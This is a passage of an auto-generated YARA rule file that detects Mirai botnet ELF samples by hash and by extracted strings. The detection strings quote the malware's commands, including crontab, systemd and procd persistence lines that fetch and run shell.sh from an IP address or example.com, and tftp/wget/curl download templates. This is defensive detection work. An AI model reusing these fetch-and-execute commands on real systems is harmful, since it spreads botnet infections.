      hash27 = "ebc165044f9992ecedf0dcbaed4ac4ccdaaa19036b8a4aad2bd8b7e37e5d45ce"
      hash28 = "ed740340f76a60354fcf64a31fcef8de61e384198ff6b3df3e853e3307f78182"
      hash29 = "eff30b6f1bd519e7eb9f1db8aa6ba28935e4bb61d22ff13c1e7f84f0bca9cf79"
      hash30 = "f076cd1f27c46e4f8246e510db72fed685b2e2dde25c5742edd8782865a54a1c"
      hash31 = "f0f86f0b3302af992b58cf1ebb242a4df3fdb1364a732bfbb470c07e32e9529b"
      hash32 = "f1e22b07b5ce860eaa4f71a1cf969104c463b93833b5f66a27012c26aab609ef"
      hash33 = "f1fd54f367be7486d8ba5e54c7f639d1d54bb4d72f8eb45a14fe0554924a0fa5"
      hash34 = "f25f8be191753e7c2c2f692ecac5504588b20a307e1aa7c23fbdfd0eeffa4505"
      hash35 = "f26608a21e20a36fb3a19eba39e3185a3fc0bad4d5c698687817109acb539f89"
      hash36 = "f33b96ef78ec02b10f9393801cfd8dc903bae78d160f8732e5ff7e7e03f79a75"
      hash37 = "f67bf8d7c2722948e3f67e417efbc6cde083ea079c357d7ee912029fb284b7be"
      hash38 = "f6b54458fc39b77bec5ff4aa62675500be17141a934a6eae674d39675f747541"
      hash39 = "f6e345ae22b86f25b02ba011579c7344c6cd535a829400dd72f7fb5afd9756ce"
      hash40 = "f7af35b2bb0e39c779cb7097df2cc2e98f9815e7d1d313d2403250d88172b656"
      hash41 = "f99af9b157312a7a3354510b193d98ab4edce5ae5ccaa98284ca62e7e12c693e"
   strings:
      $s1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17" fullword ascii /* score: '12.00'*/
      $s2 = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" fullword ascii /* score: '12.00'*/
      $s4 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" fullword ascii /* score: '12.00'*/
      $s5 = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.1024" ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/5" ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
      $s12 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__c9088a50_Mirai_signature__ce7cb803_Mirai_signature__d56d11f7_Mirai_signature__d8c941eb_Mirai_signature__e1_21 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_c9088a50.elf, Mirai(signature)_ce7cb803.elf, Mirai(signature)_d56d11f7.elf, Mirai(signature)_d8c941eb.elf, Mirai(signature)_e1f2bee8.elf, Mirai(signature)_e26709b0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c9088a5062bff0babbd7d0d57db04bbb246f42f1d27a070bc8f9cd218b80d6ff"
      hash2 = "ce7cb803babd922594b2ce97be253cf34f26820c77fb04b4e949e9c475b17e95"
      hash3 = "d56d11f7692f85f018f8829b899048cf3350aba9c1578302c6cb3db67608c8bd"
      hash4 = "d8c941eba0c43a485425d6270cc1c48a486fb1be5c998e116488f63efcb99421"
      hash5 = "e1f2bee863285795dcfa3d6298b38ee2be3e6f8a70f64f1c0de5874251cef63e"
      hash6 = "e26709b0904aba7f3288f3f83631e58a126d492f420c8310133cc6fbf81676ee"
   strings:
      $s1 = "HTTP.GET" fullword ascii /* score: '18.00'*/
      $s2 = "GET %s?%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s3 = "GET /%s?%s HTTP/1.1" fullword ascii /* score: '15.00'*/
      $s4 = "HTTP.OVH" fullword ascii /* score: '13.00'*/
      $s5 = "parse_command" fullword ascii /* score: '12.00'*/
      $s6 = "attack_http_get" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s9 = "make_ip_header" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__b2c308b4_Mirai_signature__c5b68f9b_Mirai_signature__cd8f5c09_Mirai_signature__e9b39678_Mirai_signature__f6_22 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b2c308b4.elf, Mirai(signature)_c5b68f9b.elf, Mirai(signature)_cd8f5c09.elf, Mirai(signature)_e9b39678.elf, Mirai(signature)_f692fc8b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b2c308b4e9bf0aa29474550b82b687ca07648d8d814fb0564e60afa8d622ee29"
      hash2 = "c5b68f9bef05fd8cadedc3d99742d801eaa44a3b02066511c74d96daba4db635"
      hash3 = "cd8f5c0927f3cac4d225a5fee8b8d409712cf1a7e7cea5b1b903c3caad59808f"
      hash4 = "e9b396781f1f326b9b66ff4139e89de6b55ea9aae5b4d271396a49d97bd56599"
      hash5 = "f692fc8b862f4ab4c96c4dc9da877667245cfba00d686736d67fc20e40bf3301"
   strings:
      $x1 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then s" ascii /* score: '53.00'*/
      $x2 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then s" ascii /* score: '50.00'*/
      $x3 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell." ascii /* score: '45.00'*/
      $x4 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s" ascii /* score: '44.00'*/
      $x5 = "askid | grep -v grep >/dev/null || (for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '38.00'*/
      $x6 = "for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break" ascii /* score: '38.00'*/
      $x7 = "for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break" ascii /* score: '38.00'*/
      $x8 = "$t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart') | " ascii /* score: '36.00'*/
      $x9 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s" ascii /* score: '36.00'*/
      $x10 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell." ascii /* score: '35.00'*/
      $x11 = "    for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; b" ascii /* score: '33.00'*/
      $x12 = "    for t in curl wget; do T=/tmp/.s$$; if $t https://example.com/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; b" ascii /* score: '33.00'*/
      $s13 = "        if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
      $s14 = "      if $tool 'https://example.com/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '30.00'*/
      $s15 = "h $T&; rm -f $T; break; fi; rm -f $T; done; exec %s skidstart'" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 800KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__bf754dbc_Mirai_signature__e3510286_23 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_bf754dbc.elf, Mirai(signature)_e3510286.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bf754dbc36e70fe81668248e1aa553825154b0eae0b6b3ba120494d0bf2f2980"
      hash2 = "e35102864c80d5b00e3d68918e4f5212d65efa2d3366dd7142203e787b65d43a"
   strings:
      $x1 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then " ascii /* score: '51.00'*/
      $x2 = "ExecStart=/bin/sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then " ascii /* score: '48.00'*/
      $x3 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell" ascii /* score: '43.00'*/
      $x4 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '42.00'*/
      $x5 = "for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; brea" ascii /* score: '36.00'*/
      $x6 = "raskid | grep -v grep >/dev/null || (for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [" ascii /* score: '36.00'*/
      $x7 = "for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; brea" ascii /* score: '36.00'*/
      $x8 = "    procd_set_param command sh -c 'for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -" ascii /* score: '34.00'*/
      $x9 = "(crontab -l 2>/dev/null | grep -v 'uraskid' ; echo '@reboot for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell" ascii /* score: '33.00'*/
      $x10 = "    for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; " ascii /* score: '31.00'*/
      $x11 = "    for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; " ascii /* score: '31.00'*/
      $x12 = "f $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart')" ascii /* score: '31.00'*/
      $s13 = "      if $tool 'http://94.154.35.154/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '28.00'*/
      $s14 = "        if $tool 'http://94.154.35.154/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '28.00'*/
      $s15 = "sh $T&; rm -f $T; break; fi; rm -f $T; done; exec %s skidstart'" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__b52643bc_Mirai_signature__b9f808b7_Mirai_signature__c6e5e3de_Mirai_signature__dc512e5d_Mirai_signature__f0_24 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b52643bc.elf, Mirai(signature)_b9f808b7.elf, Mirai(signature)_c6e5e3de.elf, Mirai(signature)_dc512e5d.elf, Mirai(signature)_f0af9af0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b52643bcce41d7483fcc926ba1bf841dc5693549e9c0765c38f42eeaf199f831"
      hash2 = "b9f808b7c2d63b94a2b771b2888c6608c96234ba2f0aa227cb73579d6204ca2d"
      hash3 = "c6e5e3def1ed99838f5035777a2a9f02947e4b4d7420e7b3095a00ef4b22a3d9"
      hash4 = "dc512e5dda3851a35f7e1e3dd54769e3fedc513d3faa43a07309ed3b05a6b6b1"
      hash5 = "f0af9af005ea457a061820f2de33adbc9353ab09378960b738afb023264e23db"
   strings:
      $s1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00" fullword ascii /* score: '12.00'*/
      $s2 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51" fullword ascii /* score: '12.00'*/
      $s3 = "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16" fullword ascii /* score: '12.00'*/
      $s4 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" fullword ascii /* score: '12.00'*/
      $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00" fullword ascii /* score: '12.00'*/
      $s7 = "GET /cdn-cgi/l/chk_captcha HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00" fullword ascii /* score: '12.00'*/
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__b16979fe_Mirai_signature__b19e2a2d_Mirai_signature__b1ef8d7a_Mirai_signature__b2fe8670_Mirai_signature__b3_25 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b16979fe.elf, Mirai(signature)_b19e2a2d.elf, Mirai(signature)_b1ef8d7a.elf, Mirai(signature)_b2fe8670.elf, Mirai(signature)_b3570177.elf, Mirai(signature)_b622c37b.elf, Mirai(signature)_b66de47e.elf, Mirai(signature)_b75909ad.elf, Mirai(signature)_b81a6f1a.elf, Mirai(signature)_b82a4ae6.elf, Mirai(signature)_b9e02f35.elf, Mirai(signature)_ba0ab0a1.elf, Mirai(signature)_bb3e1db2.elf, Mirai(signature)_bc0ebbec.elf, Mirai(signature)_bc5e6c53.elf, Mirai(signature)_bc9c5261.elf, Mirai(signature)_bcf3f558.elf, Mirai(signature)_bd72e052.elf, Mirai(signature)_beb4d9b7.elf, Mirai(signature)_bec7e174.elf, Mirai(signature)_c020c60b.elf, Mirai(signature)_c044c53a.elf, Mirai(signature)_c21271bd.elf, Mirai(signature)_c2e6dba5.elf, Mirai(signature)_c3f4fcb5.elf, Mirai(signature)_c4201234.elf, Mirai(signature)_c50371f7.elf, Mirai(signature)_c57278c3.elf, Mirai(signature)_c5f3d4bf.elf, Mirai(signature)_c6a82233.elf, Mirai(signature)_c96d5c22.elf, Mirai(signature)_cad760a1.elf, Mirai(signature)_cd7a9771.elf, Mirai(signature)_cdaed327.elf, Mirai(signature)_cdd6b461.elf, Mirai(signature)_ceb8a233.elf, Mirai(signature)_cf4e1220.elf, Mirai(signature)_d02040a9.elf, Mirai(signature)_d1cffa70.elf, Mirai(signature)_d2036589.elf, Mirai(signature)_d315580b.elf, Mirai(signature)_d394e141.elf, Mirai(signature)_d4e23115.elf, Mirai(signature)_d5379e65.elf, Mirai(signature)_d6725a35.elf, Mirai(signature)_d6c600c2.elf, Mirai(signature)_d7a6e898.elf, Mirai(signature)_d82bfbab.elf, Mirai(signature)_d96dd8cd.elf, Mirai(signature)_d9ec56d6.elf, Mirai(signature)_daa678a9.elf, Mirai(signature)_db3e93d5.elf, Mirai(signature)_dc5dea11.elf, Mirai(signature)_dd3f3f91.elf, Mirai(signature)_e2d4af23.elf, Mirai(signature)_e3c6cc62.elf, Mirai(signature)_e4592759.elf, Mirai(signature)_e53f6f0f.elf, Mirai(signature)_e5d88549.elf, Mirai(signature)_e68e027b.elf, Mirai(signature)_e8ebceb7.elf, Mirai(signature)_e95dbb09.elf, Mirai(signature)_e972593b.elf, Mirai(signature)_eabf54a1.elf, Mirai(signature)_eae7ea2a.elf, Mirai(signature)_eb6bc8ce.elf, Mirai(signature)_ebc16504.elf, Mirai(signature)_ec9b823d.elf, Mirai(signature)_ecfca332.elf, Mirai(signature)_ed740340.elf, Mirai(signature)_ee39075e.elf, Mirai(signature)_ee661903.elf, Mirai(signature)_eff30b6f.elf, Mirai(signature)_f076cd1f.elf, Mirai(signature)_f0f86f0b.elf, Mirai(signature)_f12a1532.elf, Mirai(signature)_f170760c.elf, Mirai(signature)_f1e22b07.elf, Mirai(signature)_f1fd54f3.elf, Mirai(signature)_f25f8be1.elf, Mirai(signature)_f26608a2.elf, Mirai(signature)_f33b96ef.elf, Mirai(signature)_f35c396d.elf, Mirai(signature)_f5ec96e2.elf, Mirai(signature)_f67bf8d7.elf, Mirai(signature)_f6b54458.elf, Mirai(signature)_f6e345ae.elf, Mirai(signature)_f785811b.elf, Mirai(signature)_f7af35b2.elf, Mirai(signature)_f99af9b1.elf, Mirai(signature)_fa8e9b22.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b16979fee68886ea04f4bdcc24f0edcc406a0bcdf8bc4c2e7a1f34fa2c2d3e9e"
      hash2 = "b19e2a2d833518ae913c0f16e262c4d89df59d2256db444af93ee49ef25a93d0"
      hash3 = "b1ef8d7acdb8ff0c0c0d9444de98223dde7d240996bb314ef3e3750674f35b7c"
      hash4 = "b2fe8670b8214083089628d0b0baff1c2a0fabe781989d43be7af7c44bff69e4"
      hash5 = "b357017795028b639d77df34ea66c8c397757ae25a90c5e06bd7ae213e97f430"
      hash6 = "b622c37ba1b4ab9017550f52aded434022b3e3d213330668dfed02732f48b97a"
      hash7 = "b66de47ecd0ff70ddc9bd24b5109396306270527f0cd60a5d104b3c0296f7b5f"
      hash8 = "b75909ad2307983e0fd8de1048bb77b0ce12d0bedcd6257ac127a1df44cf561f"
      hash9 = "b81a6f1a0f3fe99e931f1251ada1daefadf80c909c659143fce4d0c5826a7d6f"
      hash10 = "b82a4ae67007ebd1c6062c1cc3ecfec28269e63936849fada0996909ebc5af27"
      hash11 = "b9e02f35234938c0491e7c6c80f0592ebc11550f931bc3b39f82631661cb0865"
      hash12 = "ba0ab0a14545546096dee5e702e2bb97dc45dd2c295313cd6ab2ccbb61bc2d2a"
      hash13 = "bb3e1db2ee359592567e2506d5a2eb0ae87ce29b1d9dad08f610b53827c84ad6"
      hash14 = "bc0ebbecb6773f52d01daa0bc6435b48b71bb73d1d1f4bdc230e5533a62dc7a3"
      hash15 = "bc5e6c53ac612a1fd7e24426dcb58ceb32a849ffac7ac0cb2939c765ed72ada1"
      hash16 = "bc9c52616fd3cea422863f340e1c5b2704e2bfba45cbf9872a599e88bb948a2b"
      hash17 = "bcf3f5586ddeefe6185e8154feed3eacd508f4e4b7d60984a85e93f667d8ae84"
      hash18 = "bd72e0522ddf03337c08230ab26af4d7150683c4f52d09d5017e34a6abba1049"
      hash19 = "beb4d9b74735beb1b2768fad08907f2159900d04ea72870f40448c09029a5a97"
      hash20 = "bec7e174837eee065ca34161a4ad9f4a0cf3f2793a4c1dfa5658453f88130326"
      hash21 = "c020c60b270abe5cd08479130be7f0bb753e7ddabecb58641fa50cd38b23895a"
      hash22 = "c044c53af22b7392c439928aa9f6de83ca52de1d4631f7b7f8b943e6a94e6e3e"
      hash23 = "c21271bd3e8a8fc09997f315f9f4100a7ce7765e2bc7b3e5862016e3c425c581"
      hash24 = "c2e6dba52c0709ac9e0d9ea87422df7d246e77fdce651aa816b4ac47471adfb2"
      hash25 = "c3f4fcb528d5a7cd19b84f2d949c3dd54a44826187f267b101ebf70f9f6cace3"
      hash26 = "c4201234543c5191a40a0da9f9173f4fe0bdb2dfd6b8e507e64b3c0ff6a3c4d3"
      hash27 = "c50371f7af99bb85112a7962c69aba4acdfcd707cc436f80494b25281c29a350"
      hash28 = "c57278c3488fc7d64ce0a17f8e24a6ac8715b9c3c8229d8be6ff8347939963f7"
      hash29 = "c5f3d4bfaef2eccaf02c3671b4de9abc6e52b109ab3f0ba02c81b16183fcb8ed"
      hash30 = "c6a82233b0a4d012a529b1aa98d0fcc2f4579a52aa15643519c839a9cc8d348e"
      hash31 = "c96d5c22cc6ff3b595201ba1056060d45ec86974cb01796dc50d43df33a628ab"
      hash32 = "cad760a135de181db58472ff293783dc740823d1507dcb73914268e8c8201f9c"
      hash33 = "cd7a9771988f2f8291dc117eae0f4b414d6c3db0352b7e6ca115b8ad55f4190d"
      hash34 = "cdaed327029ab518015ad1ee9aa1243349717101f7dabbbc946e71c46c148856"
      hash35 = "cdd6b4613b33a669fca7da5c4e79f23c50af95abc70ca87a5c36b60dd0ffed1d"
      hash36 = "ceb8a233f20930edf7159e048eb4def0bcd9dc3dda3a2018023e02758fe3e7cb"
      hash37 = "cf4e12206405d31e413b2d539e7b57d9f04fdd6626cf211b98895973b818866e"
      hash38 = "d02040a95cc6a7f8d982b950a8293ccab8160bb580bb279afa8a38676d39f0dd"
      hash39 = "d1cffa7060b325cb0d532fab34befcd9b3b93d8116c68f65b004d47bb65ff363"
      hash40 = "d2036589e1c898405c06ae33bbd2b31430a450f7cd4b5bbce73d48d81bfeb1bc"
      hash41 = "d315580b4383b94fd5d2a8aefe186d2b9380cf29081796e7ed82b403f6854bb0"
      hash42 = "d394e141784ecd2910a33e57e7660352d7aa81f488c02813dc9e5d91f22095c3"
      hash43 = "d4e23115478baef3fe7d782422bb79934234d85b53d72de45a719153f9f8152f"
      hash44 = "d5379e65966d057b058d36229b8a1159617f986701714ffa193028465b6a09e3"
      hash45 = "d6725a350df11682a3b2d36d68d40189206d027ef265f2db53b013746295876d"
      hash46 = "d6c600c246e5127a83fa1b12863e9ad6b79142edc96023acb6ceba8d94b17322"
      hash47 = "d7a6e89890175cf9c073f1702184342bb575c1a42c9a590dae19a5597c4860fa"
      hash48 = "d82bfbab2112ba7bfe20a67c4601647244480344814a4963a4a6005a69cc790d"
      hash49 = "d96dd8cdb9275d2f71905a1f3ca11cb2940ba5446cdd06479e053eb77dc096ef"
      hash50 = "d9ec56d62afbd13fd9f679256e41f9045ccee0cdd5e6c2ba8b0cf5f4aff33e9a"
      hash51 = "daa678a9af2e9cc29fdd4f2adc9af6e7e9764d6c53dd50a9e156019928e94615"
      hash52 = "db3e93d5e98613b32c498d6c00086eb56df85ca89121e92b1e9254c98b9257a5"
      hash53 = "dc5dea1154f1478f077e85f20479fb1e0f90a6e6c69861b8129ea8830d8e2a99"
      hash54 = "dd3f3f9102954d6b3620ac27d40ceb5e4eb70a24c8736bccec24db57b0833b03"
      hash55 = "e2d4af236099d06c6f359cc77e34d22f603c2d27245e61d2bd7c5321dccfa0d0"
      hash56 = "e3c6cc622a79d3edcb76b52e1e2a3d1007be421481dd1e3802655fc3739d4b6c"
      hash57 = "e45927592cace0bd143fa2b269f67837bf6c3b10d879885220890bbfd394d8c1"
      hash58 = "e53f6f0f99dc5706564f167480a488831b74744685260db31966e0bb038d40ed"
      hash59 = "e5d885497dde82a377068db7d18bb7477e7f9aff5db0057d96ee0dd921b5a572"
      hash60 = "e68e027b24515ce7bf4ee5c9a4d467b53191184e8a0376d247e9b3bba62f3efa"
      hash61 = "e8ebceb723d3a4567dc97611bf92c5f31a3f955a4b4e9d5a6a266caf7cd8fc54"
      hash62 = "e95dbb09b8ed6de0adf835a67bc256101bfdf539a0aee9b505d0ea60f4114271"
      hash63 = "e972593b939c64aa7790812391c5f0a98df0b936a5c093cd182454283d980bd9"
      hash64 = "eabf54a14f6e7c04a850cfbcd1a6037ec6e90c739aab95ffed96a136aba127fe"
      hash65 = "eae7ea2a343f0abbf04ba28af13067857624042b40141c15af1fe7529d9511b1"
      hash66 = "eb6bc8cec6a20cbbbfda6deebf3bd9aae7dad48a5f03ccaeedab5653cb8fe507"
      hash67 = "ebc165044f9992ecedf0dcbaed4ac4ccdaaa19036b8a4aad2bd8b7e37e5d45ce"
      hash68 = "ec9b823d764b3e2ffeef680a1767f4eca26e164873f3d7bdf5571871c2b23344"
      hash69 = "ecfca3322cd2a6a0b293d64da6023a1417872d5c808eb66b05ea4b87256cea25"
      hash70 = "ed740340f76a60354fcf64a31fcef8de61e384198ff6b3df3e853e3307f78182"
      hash71 = "ee39075e53eb9454ea4e3fa1f1e13ceb1d79512e031068f637c0f51e7db7baa0"
      hash72 = "ee66190326af10358fd8534e36bfa4eb8f5dc04846c454f7df03f50e08886dec"
      hash73 = "eff30b6f1bd519e7eb9f1db8aa6ba28935e4bb61d22ff13c1e7f84f0bca9cf79"
      hash74 = "f076cd1f27c46e4f8246e510db72fed685b2e2dde25c5742edd8782865a54a1c"
      hash75 = "f0f86f0b3302af992b58cf1ebb242a4df3fdb1364a732bfbb470c07e32e9529b"
      hash76 = "f12a15321f9640a6c8b24e0d4863b32c1f2f012b4594403b835900426583bb75"
      hash77 = "f170760cf7e7190beb4848512d72c2f075cc76d827ba69532076c399b7c0a2ba"
      hash78 = "f1e22b07b5ce860eaa4f71a1cf969104c463b93833b5f66a27012c26aab609ef"
      hash79 = "f1fd54f367be7486d8ba5e54c7f639d1d54bb4d72f8eb45a14fe0554924a0fa5"
      hash80 = "f25f8be191753e7c2c2f692ecac5504588b20a307e1aa7c23fbdfd0eeffa4505"
      hash81 = "f26608a21e20a36fb3a19eba39e3185a3fc0bad4d5c698687817109acb539f89"
      hash82 = "f33b96ef78ec02b10f9393801cfd8dc903bae78d160f8732e5ff7e7e03f79a75"
      hash83 = "f35c396dcaee53790479e0dbf589cd2736bf3af533e1b6d0207f1b9b0a9e63cb"
      hash84 = "f5ec96e266197b248501b85f584798ffbbff0e78744e2d3ad817a2c997818ea8"
      hash85 = "f67bf8d7c2722948e3f67e417efbc6cde083ea079c357d7ee912029fb284b7be"
      hash86 = "f6b54458fc39b77bec5ff4aa62675500be17141a934a6eae674d39675f747541"
      hash87 = "f6e345ae22b86f25b02ba011579c7344c6cd535a829400dd72f7fb5afd9756ce"
      hash88 = "f785811b24888a611c53bc1fcacbd41ebd2aa319e973ac6875be98fe9943559c"
      hash89 = "f7af35b2bb0e39c779cb7097df2cc2e98f9815e7d1d313d2403250d88172b656"
      hash90 = "f99af9b157312a7a3354510b193d98ab4edce5ae5ccaa98284ca62e7e12c693e"
      hash91 = "fa8e9b226fbda3a80ae5dee88862b62bfa8ade131fe5e999131cc6fa38ce9b27"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
